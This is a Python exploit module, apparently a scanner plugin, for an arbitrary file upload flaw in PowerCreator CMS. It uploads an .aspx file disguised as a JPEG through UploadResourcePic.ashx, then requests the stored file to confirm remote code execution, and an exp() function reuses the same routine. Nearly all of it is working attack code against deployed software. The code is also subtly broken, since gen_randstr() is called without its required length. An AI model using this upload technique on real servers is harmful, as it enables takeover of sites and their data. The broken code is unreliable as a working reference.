import requests
import re
import random
import string


# Vuln Base Info
def info():
    return {
        "author": "cckuailong",
        "name": '''PowerCreator CMS RCE''',
        "description": '''''',
        "severity": "critical",
        "references": [
            "https://wiki.96.mk/Web%E5%AE%89%E5%85%A8/PowerCreatorCms/PowerCreatorCms%E4%BB%BB%E6%84%8F%E4%B8%8A%E4%BC%A0/"
        ],
        "classification": {
            "cvss-metrics": "",
            "cvss-score": "",
            "cve-id": "",
            "cwe-id": ""
        },
        "metadata":{
            "vuln-target": "",
            
        },
        "tags": ["rce", "powercreator"],
    }


# Vender Fingerprint
def fingerprint(url):
    return True

# Proof of Concept
def poc(url):
    result = {}
    randstr = gen_randstr()
    try:
        url = format_url(url)

        path = """/upload/UploadResourcePic.ashx?ResourceID=8382"""
        method = "POST"
        data = """-----------------------------20873900192357278038549710136
Content-Disposition: form-data; name="file1"; filename="poc.aspx"
Content-Type: image/jpeg

{randstr}
-----------------------------20873900192357278038549710136--""".format(randstr=randstr)
        headers = {'Content-Disposition': 'form-data;name="file1";filename="poc.aspx";', 'Content-Type': 'multipart/form-data; boundary=---------------------------20873900192357278038549710136'}
        resp0 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)
        tmp = re.findall("(.*?.ASPX)", resp0.text)
        if tmp:
            endpoint = tmp[0]
        else:
            result["success"] = False
            return result

        path = """/ResourcePic/{endpoint}""".format(endpoint=endpoint)
        method = "GET"
        data = """"""
        headers = {}
        resp1 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        if resp1.status_code == 200 and randstr in resp1.text:
            result["success"] = True
            result["info"] = info()
            result["payload"] = url+path

    except:
        result["success"] = False
    
    return result


# Exploit, can be same with poc()
def exp(url):
    return poc(url)


# Utils
def format_url(url):
    url = url.strip()
    if not ( url.startswith('http://') or url.startswith('https://') ):
        url = 'http://' + url
    url = url.rstrip('/')

    return url

def gen_randstr(length):
    return ''.join(random.sample(string.ascii_letters + string.digits, length))